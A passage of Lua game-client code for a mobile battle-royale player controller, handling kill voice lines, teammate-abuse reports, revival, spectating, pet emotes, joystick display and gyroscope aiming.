  self:DestroyFlyDeviceAnimCache()
end

function PlayerControllerBase:DestroyFlyDeviceAnimCache()
  local uCharacter = self:GetPlayerCharacterSafety()
  local ASTExtraPlayerController = import("/Script/ShadowTrackerExtra.STExtraPlayerController")
  local GameLuaAPI = import("/Script/ShadowTrackerExtra.GameLuaAPI")
  if slua.isValid(uCharacter) then
    local Controller = uCharacter:GetPlayerControllerSafety()
    if not slua.isValid(Controller) or not GameLuaAPI.IsClassOf(Controller, ASTExtraPlayerController) then
      return
    end
    Controller:SetParachuteAnimCached(2, false)
  elseif self:IsSpectator() then
    local SpectatorPawn = self:GetCurPawn()
    if not slua.isValid(SpectatorPawn) then
      return
    end
    local Controller = SpectatorPawn:GetPlayerControllerSafety()
    if not slua.isValid(Controller) or not GameLuaAPI.IsClassOf(Controller, ASTExtraPlayerController) then
      return
    end
    Controller:SetParachuteAnimCached(2, false)
  end
end

function PlayerControllerBase:HandleOnPlayerKilledOthersPlayer(FatalDamageParameter)
  if FatalDamageParameter.causerKey == self.PlayerKey then
    local MyHUD = self:GetHUD()
    local IsDying = FatalDamageParameter.ResultHealthStatus == 1 and FatalDamageParameter.PreviousHealthStatus == 0
    local IsDeath = FatalDamageParameter.ResultHealthStatus == 2
    MyHUD:PlayFatalDamageSound(IsDying, IsDeath)
  end
  local EFatalDamageRelationShip = import("EFatalDamageRelationShip")
  if FatalDamageParameter.Relationship == EFatalDamageRelationShip.MyTeamateIsCauser then
    local ScriptGameplayStatics = import("ScriptGameplayStatics")
    local uPlayerCharacter = ScriptGameplayStatics.GetCharacterByPlayerKey(self, FatalDamageParameter.causerKey)
    if slua.isValid(uPlayerCharacter) and slua.isValid(uPlayerCharacter.CharacterAvatarComp2_BP) then
      local EAvatarSlotType = import("EAvatarSlotType")
      uPlayerCharacter.CharacterAvatarComp2_BP:SetMeshVisibleByID(EAvatarSlotType.EAvatarSlotType_FootEffectEquipemtSlot, true, false, true)
    end
  end
  if self.CanModPlayActorVoiceFeature then
    local ECharacterHealthStatus = import("ECharacterHealthStatus")
    local CanPlay = FatalDamageParameter.ResultHealthStatus == ECharacterHealthStatus.FinishedLastBreath and FatalDamageParameter.causerKey == self.PlayerKey and FatalDamageParameter.Relationship ~= EFatalDamageRelationShip.MyTeammateIsCauserAndVictim
    if not CanPlay then
      return
    end
    local voiceKey
    if LobbySystem.CheckOpen(BP_EUNM_NEW_ACTOR_VOICE_FEATURES_SWITCH_V2) then
      local SettingConfig = slua_GameFrontendHUD:GetUserSettings()
      local PlayerFeatureVoiceCfg = SettingConfig.PlayerFeatureVoiceCfg
      if not PlayerFeatureVoiceCfg then
        return
      end
      local SettingValue = PlayerFeatureVoiceCfg:Get("SelfKillOthers")
      if not SettingValue then
        return
      end
      local StringUtil = require("common.string_util")
      local VoiceKeyList = StringUtil.Split(SettingValue, "|")
      if VoiceKeyList and next(VoiceKeyList) then
        voiceKey = tonumber(VoiceKeyList[math.random(#VoiceKeyList)])
      end
    elseif LobbySystem.CheckOpen(BP_EUNM_NEW_ACTOR_VOICE_FEATURES_SWITCH) then
      local SettingModule = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.SettingModule)
      local ActorVoiceSystem = require("client.slua.logic.actor_voice.logic_actor_voice")
      local SettingValue = SettingModule:GetOptionValue("PlayerChatActorID")
      if not SettingValue or not ActorVoiceSystem.CheckIsActorValid(SettingValue) then
        return
      end
      local ActorFeatureData = CDataTable.GetTableData("ActorVoiceFeatures", SettingValue)
      if not ActorFeatureData then
        return
      end
      voiceKey = ActorFeatureData.SelfKillOthersVoiceID
    end
    if voiceKey then
      self:SendStringMsg("", voiceKey, 0, "", 0, 0, true, false, false)
    end
  end
end

function PlayerControllerBase:RPC_Client_MaliciousTeammateReceiveWarningTips()
  local ClientQuickReportMaliciousTeammate = require("GameLua.Mod.BaseMod.Client.Security.ClientQuickReportMaliciousTeammate")
  if not ClientQuickReportMaliciousTeammate then
    return
  end
  ClientQuickReportMaliciousTeammate.MaliciousTeammateReceiveWarningTips()
end

function PlayerControllerBase:RPC_Client_MaliciousTeammateVictimReceiveTips(sTeammateUID, bIsForbidPickupRevokable, nVictimHealthStatus)
  local ClientQuickReportMaliciousTeammate = require("GameLua.Mod.BaseMod.Client.Security.ClientQuickReportMaliciousTeammate")
  if not ClientQuickReportMaliciousTeammate then
    return
  end
  ClientQuickReportMaliciousTeammate.MaliciousTeammateVictimReceiveTips(sTeammateUID, bIsForbidPickupRevokable, nVictimHealthStatus)
end

function PlayerControllerBase:RPC_Client_PopupAFKWindow(IsWarning, ShouldClose)
  local IngameTipsTools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
  if ShouldClose then
    IngameTipsTools.HideAllMsgBox()
  elseif IsWarning then
    IngameTipsTools.HideAllMsgBox()
    IngameTipsTools.ShowMsgBox(1, LocUtil.GetLocalizeResStr(612401041), LocUtil.GetLocalizeResStr(612401042), function()
    end)
  else
    IngameTipsTools.HideAllMsgBox()
    IngameTipsTools.ShowMsgBox(1, LocUtil.GetLocalizeResStr(612401043), LocUtil.GetLocalizeResStr(612401044), function()
    end)
  end
end

function PlayerControllerBase:IsRevivalMode()
  local bIsRevival = self:TeammateCanRevival()
  if not bIsRevival then
    bIsRevival = self.Super:IsRevivalMode()
  end
  return bIsRevival
end

function PlayerControllerBase:TeammateCanRevival()
  local uPlayerState = self.PlayerState
  if slua.isValid(uPlayerState) and uPlayerState.GetTeamMatePlayerStateList then
    local tTeammate = uPlayerState:GetTeamMatePlayerStateList({}, false)
    for _, uTeamPlayerState in pairs(tTeammate) do
      if slua.isValid(uTeamPlayerState) and uTeamPlayerState.HasAnyReviveChance and uTeamPlayerState:HasAnyReviveChance() then
        return true
      end
    end
  end
  return false
end

function PlayerControllerBase:CanBePickUpByItemID(DefineID)
  if CGameState and slua.isValid(CGameState) and CGameState.ReviveState then
    local ItemId = CGameState.ReviveState:GetConfigSelfReviveItemId()
    if DefineID.TypeSpecificID ~= ItemId then
      return self.Super:CanBePickUpByItemID(DefineID)
    end
    local ItemLimitedTime = CGameState.ReviveState:GetConfigItemLimitedTime()
    if ItemLimitedTime < CGameState:GetServerWorldTimeSeconds() then
      return false
    end
  end
  local uPlayerState = self.PlayerState
  if uPlayerState and uPlayerState.ReviveStateFeature and uPlayerState.ReviveStateFeature:GetUseSinglePlayerReviveItem() == true then
    return false
  end
  return self.Super:CanBePickUpByItemID(DefineID)
end

function PlayerControllerBase:GetLastestViewPlayerKey()
  return self.LastestViewPlayerKey or 0
end

function PlayerControllerBase:HandlePlayerExitGame(ParamState, ParamReason)
  local uPlayerState = self.PlayerState
  if uPlayerState and slua.isValid(uPlayerState) then
    local bIsAlive = uPlayerState:IsAlive()
    local HasChance = false
    if uPlayerState.HasAnyReviveChance then
      HasChance = uPlayerState:HasAnyReviveChance()
    end
    if bIsAlive or HasChance then
      local DSAITLogSubsystem = SubsystemMgr:Get("DSAITLogSubsystem")
      if DSAITLogSubsystem and DSAITLogSubsystem.HandlePlayerStateChanged then
        DSAITLogSubsystem:HandlePlayerStateChanged(nil, nil, uPlayerState.UID, ParamState, nil, bIsAlive, ParamReason)
      end
    end
    if not bIsAlive then
      if uPlayerState.ClearAllReviveCounts then
        uPlayerState:ClearAllReviveCounts()
      end
      if uPlayerState.IsInWaittingRevivalState ~= nil then
        uPlayerState.IsInWaittingRevivalState = false
      end
      if uPlayerState.bHasSendBattleResult ~= nil and uPlayerState.bHasSendBattleResult == false then
        local GameMode = UGameplayStatics.GetGameMode(self)
        Game:CheckSendBattleResult(GameMode, uPlayerState, false)
      end
    end
  else
    if bWriteLog then
      tostring(uPlayerState)
    end
  end
end

function PlayerControllerBase:HandleViewingTargetChanged(NewViewTarget)
  self:TurnOffViewingPawnOptimizationByVision()
  self:UpdateSpectatorMoveLODOptimize(NewViewTarget)
end

function PlayerControllerBase:UpdateSpectatorMoveLODOptimize(NewViewTarget)
  local ViewTarget = NewViewTarget
  if ViewTarget == nil and self.GetViewTarget then
    ViewTarget = self:GetViewTarget()
  end
  local bTrackingKiller = false
  if ViewTarget ~= nil and AKillerTracker ~= nil then
    local bOk, bIsKillerTracker = pcall(function()
      return Game:IsClassOf(ViewTarget, AKillerTracker)
    end)
    bTrackingKiller = bOk and bIsKillerTracker == true
  end
  local CVarName = "mv.SimulateMoveLODOptimize"
  local CurValue = USTExtraBlueprintFunctionLibrary.GetConsoleVariableIntValue(CVarName)
  local bReadCVarOK = CurValue ~= nil
  if not bReadCVarOK then
    CurValue = 1
  end
  if bTrackingKiller then
    if self.SavedMoveLODOptimizeValue == nil then
      self.SavedMoveLODOptimizeValue = CurValue
    end
    if CurValue ~= 0 then
      UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, string.format("%s %d", CVarName, 0))
    end
  else
    local SavedValue = self.SavedMoveLODOptimizeValue
    if SavedValue ~= nil then
      self.SavedMoveLODOptimizeValue = nil
      if not bReadCVarOK or CurValue ~= SavedValue then
        UKismetSystemLibrary.ExecuteConsoleCommand(self.Object, string.format("%s %d", CVarName, SavedValue))
      end
    end
  end
end

function PlayerControllerBase:HandleSpectatorChange()
  self:TurnOffViewingPawnOptimizationByVision()
end

function PlayerControllerBase:TurnOffViewingPawnOptimizationByVision()
  local uPlayerPawn = self:GetCurPlayerCharacter()
  if not self:HasAuthority() then
    if slua.isValid(uPlayerPawn) and slua.isValid(uPlayerPawn.ThirdPersonCameraComponent) then
      if uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteLocation then
        if uPlayerPawn.ApplyAllCompOptimizationByVision then
          uPlayerPawn:ApplyAllCompOptimizationByVision(false)
        end
        uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteLocation = false
        uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteRotation = false
        uPlayerPawn.ThirdPersonCameraComponent.bAbsoluteScale = false
      end
    end
    return
  end
  if slua.isValid(uPlayerPawn) then
    self.LastestViewPlayerKey = uPlayerPawn.PlayerKey or 0
    local uParentActor = uPlayerPawn:GetAttachParentActor()
    if slua.isValid(uParentActor) and Game:IsClassOf(uParentActor, PlaneCls) and self.ThePlane ~= uParentActor then
      self.ThePlane = self.Object
      self:OnRep_Plane()
    end
  end
end

function PlayerControllerBase:MarkTeammateExitTeamBeforeBoarding()
  if Client then
    return
  end
  self._bIsTeammateExitTeamBeforeBoarding = true
end

function PlayerControllerBase:IsTeammateExitTeamBeforeBoarding()
  return self._bIsTeammateExitTeamBeforeBoarding
end

function PlayerControllerBase:SwitchToTeammate(Idx)
  self:HandleSwitchToPlayerIndex(Idx)
end

function PlayerControllerBase:SwitchFreeViewInOB()
  self:IsObserver()
  self:IsDemoPlayGlobalObserver()
  if self:IsObserver() or self:IsDemoPlayGlobalObserver() then
    self:HandleEnterFreeViewInOB()
  end
end

PlayerControllerBase.ServerRPC.RPC_Server_ReqUseShareSkin = {
  Reliable = true,
  Params = {}
}
PlayerControllerBase.ClientRPC.RPC_Client_NotifyUseShareSkin = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_RealUseShareSkin = {
  Reliable = true,
  Params = {}
}

function PlayerControllerBase:RPC_Server_ReqUseShareSkin()
  self:RPC_Client_NotifyUseShareSkin(1)
end

function PlayerControllerBase:RPC_Server_RealUseShareSkin()
  return
end

function PlayerControllerBase:RPC_Client_NotifyUseShareSkin(Reason)
  EventSystem:postEvent(EVENTTYPE_INGAME_BACKPACK, EVENTID_BACKPACK_NOTIFY_USE_SHARESKIN, Reason)
end

function PlayerControllerBase:OnRep_nFriendLeftSharedSkinTimes()
  EventSystem:postEvent(EVENTTYPE_INGAME_BACKPACK, EVENTID_BACKPACK_INGAME_REFRESH_LEFT_TIMES)
end

function PlayerControllerBase:UseSharedBagSkin()
  return false
end

function PlayerControllerBase:SimulateTriggerInputAction(Key)
  if InputStateControl then
    InputStateControl.CallInputAction(Key)
  end
end

function PlayerControllerBase:TriggerInputAction(Key)
  if InputStateControl then
    InputStateControl.CallInputAction(Key)
  end
  if Client.IsWindowOB() or Client.IsWindows() then
    EventSystem:postEvent(EVENTTYPE_PCOB, EVENTID_PCOB_INPUT_KEY, Key)
  end
end

function PlayerControllerBase:HandleShowFollowEmoteUI(ShowFollowEmote)
  if self.bIsShowingFollowEmoteUI == ShowFollowEmote then
    return
  end
  self.bIsShowingFollowEmoteUI = ShowFollowEmote
  if ShowFollowEmote then
    EventSystem:postEvent(EVENTTYPE_INGAME_BASIC_SKILL_MENU_BP, EVENTID_SHOW_NORMAL_BTN, "Type_FollowEmote")
  else
    EventSystem:postEvent(EVENTTYPE_INGAME_BASIC_SKILL_MENU_BP, EVENTID_HIDE_NORMAL_BTN, "Type_FollowEmote")
  end
end

function PlayerControllerBase:HandleTouchInterfaceChanged()
  self:BindVirtualJoystickInputDelegates(true)
  self:BindVirtualJoystickTouchedStartInAreaDelegates(true)
end

function PlayerControllerBase:HandleOnSetPlane(Plane)
  if Client then
    return
  end
  local ENetRole = import("ENetRole")
  if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.GetOwnerObservers and not self:IsSpectator() then
    local ObserverList = self.SpectatorComponent:GetOwnerObservers()
    if ObserverList then
      for _, ObController in pairs(ObserverList) do
        if ObController and (ObController:IsSpectator() or ObController:IsInPetSpectator()) and ObController.ThePlane ~= Plane then
          ObController:SetCanGotoExPlane(true)
          ObController:SetPlane(Plane)
          ObController:SetCanGotoExPlane(false)
        end
      end
    end
  end
end

function PlayerControllerBase:HandleOnPlayerExitFlying()
  if Client then
    return
  end
  local PlayerCharacter = self:GetPlayerCharacterSafety()
  if not slua.isValid(PlayerCharacter) then
    return
  end
  local ENetRole = import("ENetRole")
  if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.GetOwnerObservers and not self:IsSpectator() then
    local ObserverList = self.SpectatorComponent:GetOwnerObservers()
    if ObserverList then
      for _, ObController in pairs(ObserverList) do
        if ObController and ObController:IsSpectator() then
          ObController:SetViewTargetTest(PlayerCharacter)
        end
      end
    end
  end
end

function PlayerControllerBase:HandleShowMovableEmoteUI(ShowFollowEmote)
  if self.bIsShowingMovableEmoteUI == ShowFollowEmote then
    return
  end
  self.bIsShowingMovableEmoteUI = ShowFollowEmote
end

function PlayerControllerBase:PlaySpecifiedPetAnimation(nAnimationID, bIsMiniTv, bIgnoreLevel)
  if Client then
    local ActionRow = CDataTable.GetTableData("PetActionTable", nAnimationID)
    local nMasterSkillID = 0
    if ActionRow and ActionRow.MasterSkillID and 0 < ActionRow.MasterSkillID then
      nMasterSkillID = ActionRow.MasterSkillID
    end
    local uCurPawn = self:GetCurPawn()
    if slua.isValid(uCurPawn) and slua.isValid(uCurPawn.PetComponent_BP) and slua.isValid(uCurPawn.PetComponent_BP.PetPawn) then
      local uActivePawn
      if bIsMiniTv then
        uActivePawn = uCurPawn.PetComponent_BP:GetMiniTVPawn()
      else
        uActivePawn = uCurPawn.PetComponent_BP.PetPawn
      end
      if slua.isValid(uActivePawn) and uActivePawn.bHidden then
        if uActivePawn.bInPetExhibiting then
          ShowNotice(82159)
        else
          ShowNotice(66661)
        end
        return
      end
      local uPetComp = uCurPawn.PetComponent_BP
      if 0 < nMasterSkillID and uPetComp.PlaySpecifiedPetAnimationCheck and not uPetComp:PlaySpecifiedPetAnimationCheck(uCurPawn) then
        return
      end
    end
    if ActionRow and ActionRow.PetAnimRes then
      do
        local Util = require("client.slua_ui_framework.util")
        Util.GetAssetAsync(ActionRow.PetAnimRes, function(uAnimation)
          if slua.isValid(uAnimation) then
            self:RPC_Server_PlaySpecifiedPetAnimation(nAnimationID, uAnimation.SequenceLength, nMasterSkillID, bIsMiniTv or false, bIgnoreLevel or false)
          end
        end)
      end
    end
  end
end

function PlayerControllerBase:RPC_Server_PlaySpecifiedPetAnimation(nAnimationID, AnimationLength, MasterSkillID, bIsMiniTv, bIgnoreLevel)
  local uCurPawn = self:GetCurPawn()
  if slua.isValid(uCurPawn) and slua.isValid(uCurPawn.PetComponent_BP) and nAnimationID and AnimationLength and 0 < AnimationLength then
    local PetEmoteConfig = CDataTable.GetTableData("PetActionTable", nAnimationID)
    if not PetEmoteConfig or PetEmoteConfig.CanPlayInBattle == 0 or PetEmoteConfig.CanPlayInBattle == 3 then
      return
    end
    local uActivePawn
    if bIsMiniTv then
      uActivePawn = uCurPawn.PetComponent_BP:GetMiniTVPawn()
    else
      uActivePawn = uCurPawn.PetComponent_BP.PetPawn
    end
    if slua.isValid(uActivePawn) then
      if uActivePawn.CanPlay and not uActivePawn:CanPlay() then
        return
      end
      if uActivePawn.bHidden then
        return
      end
    end
    if slua.isValid(uActivePawn) then
      do
        local EPetState = import("EPetState")
        if uActivePawn:PetHasState(EPetState.PetPlayingFeature) then
          return
        end

        local function EmoteIsUnLocked(EmoteID, bIsMiniTv)
          if not bIsMiniTv then
            local StringUtil = require("common.string_util")
            local PetID = uActivePawn.PetLevelInfo.PetId
            local PetLevel = uActivePawn.PetLevelInfo.PetLevel
            local ConfigID = 10000 * PetID + PetLevel
            local PetLevelConfig = CDataTable.GetTableData("PetLevelTable", ConfigID)
            local AllAction = StringUtil.Split(PetLevelConfig.AllAction, "|")
            if AllAction and 0 < #AllAction then
              for _, ID in pairs(AllAction) do
                if EmoteID == tonumber(ID) then
                  return true
                end
              end
            end
          elseif self.CommerFeature and self.CommerFeature.MiniTVActionIDList then
            for _, ID in pairs(self.CommerFeature.MiniTVActionIDList) do
              if EmoteID == tonumber(ID) then
                return true
              end
            end
          end
          return false
        end

        if bIgnoreLevel and self.bCanModPlayPetEmoteIgnoreLevel then
          self.bCanModPlayPetEmoteIgnoreLevel = false
        elseif not EmoteIsUnLocked(nAnimationID, bIsMiniTv) then
          return
        end
        if uActivePawn.BeforePlayAction then
          uActivePawn:BeforePlayAction(nAnimationID)
        end
        if MasterSkillID ~= nil and 0 < MasterSkillID then
          local SkillManager = uCurPawn:GetSkillManager()
          if slua.isValid(SkillManager) then
            local uSkill = SkillManager:GetSkill(MasterSkillID)
            if uSkill and uSkill:IsCDOK(SkillManager, -1) then
              uCurPawn:TriggerEntrySkillWithID(MasterSkillID, true)
            end
          end
          uActivePawn:PlayPetInteractAnimation(uCurPawn, nAnimationID, AnimationLength)
        else
          uActivePawn:PlayPetAnimation(nAnimationID, AnimationLength)
        end
      end
    end
  end
end

function PlayerControllerBase:RPC_Server_SetPetRandomAnimDisable(bDisable)
  if Client then
    return
  end
  local uCurPawn = self:GetCurPawn()
  if not slua.isValid(uCurPawn) or not slua.isValid(uCurPawn.PetComponent_BP) then
    return
  end
  local uPetPawn = uCurPawn.PetComponent_BP.PetPawn
  if slua.isValid(uPetPawn) then
    Game:SetAIBlackboardValue(uPetPawn, UEnums.EBlackBoardKeyType.Bool, "PetDisableRandomAnim", bDisable)
  end
end

function PlayerControllerBase:RPC_Server_SetGameReadyCountDown(nRemainingTime)
  slua.isValid(CGameMode)
  slua.isValid(CGameState)
  if not Client and slua.isValid(CGameMode) and slua.isValid(CGameState) and nRemainingTime then
    self:IsObserver()
    local diagnosticRoomOwner = self.bRoomOwner
    local diagnosticRoomType = CGameMode.RoomType
    if self:IsObserver() and self.bRoomOwner and CGameMode.RoomType == "match" then
      local GameModeState = CGameState:GetGameModeState() or ""
      if GameModeState == "ReadyState" then
        CGameState.MatchReadyConfirmed = true
        CGameMode:SetStateLeftTime(nRemainingTime)
      end
    end
  end
end

function PlayerControllerBase:BecomeAGhost(bGhost)
  self.Super:BecomeAGhost(bGhost)
  if self:IsGhost() then
    if self.DisableNetUpdateGroupID then
      self:DisableNetUpdateGroupID(1)
    else
    end
  elseif self.EnableNetUpdateGroupID then
    self:EnableNetUpdateGroupID(1)
  else
  end
end

function PlayerControllerBase:OnRep__bIsTeammateExitTeamBeforeBoarding()
  if self._bIsTeammateExitTeamBeforeBoarding then
    local UIInstance = UIManager.GetUI(UIManager.UI_Config_InGame.BirthIslandTips)
    if UIInstance and UIInstance.ShowEscapeNotice then
      UIInstance:ShowEscapeNotice()
    end
  end
end

function PlayerControllerBase:PerRespawnClearOtherPawn()
  if slua.isValid(self:GetPetSpectatorComp()) then
    self:GetPetSpectatorComp():PerRespawnClearOtherPawn()
  end
end

function PlayerControllerBase:CheckCanCustomChat()
  local GameplayData = require("GameLua.GameCore.Data.GameplayData")
  local uGameState = GameplayData.GetGameState()
  if uGameState and uGameState:GetDSSwitchValueFastWithCache(62) == "1" then
    if not Client and CGameMode and CGameMode.RoomType == "match" then
      self.bForbidCustomChat = true
    end
    if not Client then
      local GameMainConfig = require("GameLua.GameCore.Main.GameMainConfig")
      if GameMainConfig.IsPeakGame() then
        self.bForbidCustomChat = false
      end
      if GameMainConfig.IsNationEsports() then
        self.bForbidCustomChat = true
      end
    end
  end
  if Server and Server.IsMatchVersion and Server.IsMatchVersion() then
    self.bForbidCustomChat = true
  end
end

function PlayerControllerBase:LuaShowJoystickWidgetWithTag(Tag)
  self:ShowJoystickWidgetWithTag(Tag)
end

function PlayerControllerBase:LuaHideJoystickWidgetWithTag(Tag)
  self:ActivateTouchInterface(nil)
  self:HideJoystickWidgetWithTag(Tag)
end

function PlayerControllerBase:LuaShowJoystickWithTag(Tag)
  self:ShowJoystickWithTag(Tag)
end

function PlayerControllerBase:LuaHideJoystickWithTag(Tag)
  self:HideJoystickWithTag(Tag)
end

function PlayerControllerBase:SetAlwaysHideTouchInterface(Hide)
  if Hide then
    self:LuaHideJoystickWidgetWithTag("AlwaysHideTouchInterface")
  else
    self:LuaShowJoystickWidgetWithTag("AlwaysHideTouchInterface")
  end
end

function PlayerControllerBase:LuaShouldShowTouchInterface(bShow)
  return bShow
end

function PlayerControllerBase:NotCanShowTouchInterfaceHandle()
  return false
end

function PlayerControllerBase:PreShowTouchInterfaceCheck(show)
  return 0
end

function PlayerControllerBase:ShowTouchInterface(show, reason)
  local bRealShow = self:LuaShouldShowTouchInterface(show)
  if self.bIsJoyStickShow == bRealShow then
    return
  end
  if bRealShow then
    self.bIsJoyStickShow = true
    self:LuaShowJoystickWithTag("OutDatedMethodTag")
  else
    self.bIsJoyStickShow = false
    self:LuaHideJoystickWithTag("OutDatedMethodTag")
  end
end

function PlayerControllerBase:PostOnShowTouchInterface(bShow)
  if bShow then
    EventSystem:postEvent(EVENTTYPE_INGAME_UI, EVENTID_SHOW_JOYSTICK)
  end
end

function PlayerControllerBase:OnRep_bForbidCustomChat()
  EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_INGAME_REFRESH_FORBID_CUSTOM_CHAT, self.bForbidCustomChat)
end

function PlayerControllerBase:OnGoingToLoseJoystick()
  self:SetVirtualJoystickVisibility(false)
  self:ClearJoystick()
end

function PlayerControllerBase:CanExitFreeCamera()
  local IngameSelfieSubsystem = SubsystemMgr:Get("IngameSelfieSubsystem")
  if IngameSelfieSubsystem and IngameSelfieSubsystem.CanExitFreeCamera and not IngameSelfieSubsystem:CanExitFreeCamera() then
    log_warning(bWriteLog and "PlayerControllerBase:CanExitFreeCamera - return by IngameSelfieSubsystem")
    return false
  end
  return true
end

function PlayerControllerBase:HandleServerSpectatorChange(uViewTargetCharacter)
  if not Client and slua.isValid(uViewTargetCharacter) then
    if self.GetPetSpectatorComp then
      local PetSpectatorComp = self:GetPetSpectatorComp()
      if slua.isValid(PetSpectatorComp) and PetSpectatorComp.OnOwnerGotoSpectating then
        PetSpectatorComp:OnOwnerGotoSpectating()
      end
    end
    EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_INGAME_SERVER_SPECTATOR_CHANGE, self.Object, uViewTargetCharacter)
    if self:IsObserver() and slua.isValid(self.BackpackObserverRepActor) then
      local uPlayerController = uViewTargetCharacter:GetPlayerControllerSafety()
      if slua.isValid(uPlayerController) and uPlayerController.GetBackpackComponent then
        local uBackpackComp = uPlayerController:GetBackpackComponent()
        if slua.isValid(uBackpackComp) then
          self.BackpackObserverRepActor:RefreshAllItems(uBackpackComp)
        end
      end
    end
    local uParentActor = uViewTargetCharacter:GetAttachParentActor()
    local diagnosticPlayerName = uViewTargetCharacter.PlayerName
    Game:IsClassOf(uParentActor, PlaneCls)
    local diagnosticPlane = self.ThePlane
    if slua.isValid(uParentActor) and Game:IsClassOf(uParentActor, PlaneCls) and self.ThePlane ~= uParentActor then
      self.ThePlane = uParentActor
    end
  end
end

function PlayerControllerBase:RegistSetting()
  if not Client then
    return
  end
  local SettingModule = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.SettingModule)
  local bAutoUseMelee = SettingModule:GetOptionValue("AutoUseMelee")
  self:RPC_Server_SetAutoUseMelee(bAutoUseMelee)
  self:AddSettingOptionEvent("AutoUseMelee", function(AutoUseMelee)
    self:RPC_Server_SetAutoUseMelee(AutoUseMelee)
  end)
  local bPeekCanSprint = SettingModule:GetOptionValue("PeekToSprintSwitch")
  self.bPeekCanSprint = bPeekCanSprint
  self:AddSettingOptionEvent("PeekToSprintSwitch", function(InbPeekCanSprint)
    self.bPeekCanSprint = InbPeekCanSprint
  end)
  local nGyroscope = SettingModule:GetOptionValue("Gyroscope")
  self.UseMotionControlType = nGyroscope
  self:AddSettingOptionEvent("Gyroscope", function(InGyroscope)
    self.UseMotionControlType = InGyroscope
  end)
  local bGyroReverse = SettingModule:GetOptionValue("GyroReverse")
  self.GyroReverse = bGyroReverse
  self:AddSettingOptionEvent("GyroReverse", function(InGyroReverse)
    self.GyroReverse = InGyroReverse
  end)
  local bHoldGrenadeStateEnableGyro = SettingModule:GetOptionValue("HoldGrenadeStateEnableGyro")
  self.bHoldGrenadeStateEnableGyro = bHoldGrenadeStateEnableGyro
  self:AddSettingOptionEvent("HoldGrenadeStateEnableGyro", function(InHoldGrenadeStateEnableGyro)
    self.bHoldGrenadeStateEnableGyro = InHoldGrenadeStateEnableGyro
  end)
end

function PlayerControllerBase:RPC_Server_SetAutoUseMelee(bAutoUseMelee)
  if Client then
    return
  end
  self.bAutoEquipMelleeWeaponLanded = bAutoUseMelee
end

function PlayerControllerBase:JumpPlanDell(uCharacter)
  local bIsSpectator = self.IsSpectator and self:IsSpectator() or false
  if slua.isValid(uCharacter) then
    local EViewTargetBlendFunction = import("EViewTargetBlendFunction")
    if bIsSpectator then
      self:SetViewTargetWithBlend(uCharacter, 0.5, EViewTargetBlendFunction.VTBlend_Linear, 0, false)
      return
    end
    local Util = require("client.slua_ui_framework.util")
    Util.GetAssetAsync("/Game/BluePrints/Plane/BP_PlaneDummy.BP_PlaneDummy_C", function(Plane)
      if Plane and self.GetWorld and slua.isValid(uCharacter) then
        local PlaneClass = slua.loadClass("/Game/BluePrints/Plane/BP_PlaneDummy.BP_PlaneDummy")
        local UAIBlueprintHelperLibrary = import("AIBlueprintHelperLibrary")
        local Airplane = UAIBlueprintHelperLibrary.SpawnAIFromClass(self:GetWorld(), PlaneClass, nil, uCharacter:K2_GetActorLocation(), uCharacter:K2_GetActorRotation(), true)
        if bWriteLog then
          uCharacter:K2_GetActorLocation():ToString()
        end
        if Airplane and slua.isValid(uCharacter) then
          local MovementComponent = Airplane:GetComponentByClass(import("CharacterMovementComponent"))
          if MovementComponent ~= nil and slua.isValid(MovementComponent) then
            local EMovementMode = import("EMovementMode")
            MovementComponent:SetMovementMode(EMovementMode.MOVE_None, 0)
          end
          Airplane:SetLifeSpan(5)
        end
        self:SetViewTargetWithBlend(Airplane, 0, EViewTargetBlendFunction.VTBlend_Linear, 0, false)
        self:AddGameTimer(0.2, false, function()
          if slua.isValid(uCharacter) then
            self:SetViewTargetWithBlend(uCharacter, 0.5, EViewTargetBlendFunction.VTBlend_Linear, 0, false)
          end
        end)
      else
      end
    end)
  end
end

function PlayerControllerBase:ProcessMotionInputFailed(bIsAddPitch, OutPitch, bIsAddYaw, OutYaw)
  if not bIsAddPitch and not bIsAddYaw then
    return
  end
  local VehicleUserComp = self:GetVehicleUserComp()
  if not slua.isValid(VehicleUserComp) or not VehicleUserComp:CanUseGyro() then
    return
  end
  self:ProcessVehicleInput(OutPitch, OutYaw)
end

function PlayerControllerBase:MotionControliOS(AxisValue)
  self:MotionControlAndroid(AxisValue)
end

function PlayerControllerBase:MotionControlAndroid(AxisValue)
  if not Client.IsDeviceSupportGyrSensor() then
    return
  end
  local Pawn = self:K2_GetPawn()
  if not slua.isValid(Pawn) then
    if bWriteLog then
    end
    return
  end
  if not self:GetUseMotionControlEnable() then
    if bWriteLog then
    end
    return
  end
  local OutPitch = 0
  local OutYaw = 0
  local bIsAddPitch = false
  local bIsAddYaw = false
  if not self.CalInputFromRotaionRate then
    return
  end
  OutPitch, OutYaw, bIsAddPitch, bIsAddYaw = self:CalInputFromRotaionRate(OutPitch, OutYaw, bIsAddPitch, bIsAddYaw, AxisValue, self.PitchReverce, self.MotionTouchRate_Pitch, self.MotionTouchAimRate_Pitch, self.MotionRate_Pitch, self.MotionAimRate_Pitch, self.MotionTouchRate_Yaw, self.MotionTouchAimRate_Yaw, self.MotionRate_Yaw, self.MotionAimRate_Yaw, self.MotionRate_Pitch_Threshold, self.MotionRate_Yaw_Threshold, self.Left, self.Right, self.bLandScapeOrientation)
  if bIsAddPitch then
    Pawn:AddControllerPitchInput(OutPitch)
  end
  if bIsAddYaw then
    Pawn:AddControllerYawInput(OutYaw)
  end
end

PlayerControllerBase.ClientRPC.RPC_Client_ShowBattleGMOutputText = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Str
  }
}

function PlayerControllerBase:RPC_Client_ShowBattleGMOutputText(Content)
  ShowBattleGMOutputText(Content)
end

function PlayerControllerBase:ToString()
  if self.GetViewTarget then
    local ViewTarget = self:GetViewTarget()
    if slua.isValid(ViewTarget) then
